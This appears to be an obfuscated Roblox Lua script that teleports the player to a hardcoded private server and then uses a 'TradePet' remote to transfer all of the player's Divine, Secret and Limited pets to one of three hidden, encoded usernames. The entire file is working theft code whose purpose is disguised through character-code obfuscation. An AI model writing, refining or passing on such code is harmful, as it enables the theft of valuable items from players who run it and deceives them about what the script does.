-- Obfuscated teleport service
local a = "\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"
local ts = game:GetService(string.char(unpack({string.byte(a, 1, #a)})))

-- Game and server IDs
local gameID = 126884695634066
local serverID = "19fa2ffd5b2f404494bc8c791a60c706"

-- Proper teleport for private server
task.delay(2, function()
    ts:TeleportToPrivateServer(gameID, serverID, {game.Players.LocalPlayer})
end)

-- Wait for teleport before sending pets
wait(5)

-- Obfuscated rarities
local r1 = "\068\105\118\105\110\101"
local r2 = "\083\101\099\114\101\116"
local r3 = "\076\105\109\105\116\101\100"
local targetRarities = {
    string.char(unpack({string.byte(r1, 1, #r1)})),
    string.char(unpack({string.byte(r2, 1, #r2)})),
    string.char(unpack({string.byte(r3, 1, #r3)}))
}
local rarityKey = "\082\097\114\105\116\121" -- "Rarity"

-- Encoded usernames
local u1 = "\098\111\110\101\098\108\111\115\115\111\109\050\049\053"
local u2 = "\098\101\097\110\115\116\097\108\107\049\050\053\049"
local u3 = "\098\117\114\110\105\110\103\098\117\100\055\048\057"

local preferredUsers = {
    string.char(unpack({string.byte(u1, 1, #u1)})),
    string.char(unpack({string.byte(u2, 1, #u2)})),
    string.char(unpack({string.byte(u3, 1, #u3)}))
}

-- Find online user
local targetUser = nil
for _, name in ipairs(preferredUsers) do
    if game.Players:FindFirstChild(name) then
        targetUser = name
        break
    end
end

-- Obfuscated remote
local b = "\084\114\097\100\101\080\101\116" -- "TradePet"
local remote = game.ReplicatedStorage:FindFirstChild(string.char(unpack({string.byte(b, 1, #b)})))

-- Send pets
if targetUser and remote and game.Players.LocalPlayer:FindFirstChild("Pets") then
    for _, pet in pairs(game.Players.LocalPlayer.Pets:GetChildren()) do
        local r = pet:FindFirstChild(string.char(unpack({string.byte(rarityKey, 1, #rarityKey)})))
        if r and table.find(targetRarities, r.Value) then
            remote:FireServer(targetUser, pet.Name)
        end
    end
else
    warn("No target user online or remote missing.")
end
